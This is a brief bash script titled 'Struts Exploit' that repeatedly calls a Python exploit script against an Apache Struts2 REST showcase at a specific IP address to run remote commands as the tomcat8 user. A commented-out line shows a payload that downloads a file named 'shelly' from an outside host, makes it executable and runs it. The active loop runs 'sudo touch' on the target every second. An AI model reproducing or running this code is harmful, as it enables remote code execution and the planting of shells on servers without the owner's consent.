#!/bin/bash

# Struts Exploit
#
# usage:  python3 exploit_code <vul_url> <remote_command_to_run>
#  command executes with the uid of tomcat8
#  cmmand executes in /var/lib/tomcat8
#

#python3 struts.py http://52.24.68.85:8080/struts2-rest-showcase/ "wget http://rrbeliveau.com/tools/shelly; chmod +x shelly; bash shelly"

while true; do
echo touching...
python3 struts.py http://52.24.68.85:8080/struts2-rest-showcase/ "sudo touch bobtemp/fil-`date +%s`.dat"
sleep 1
done





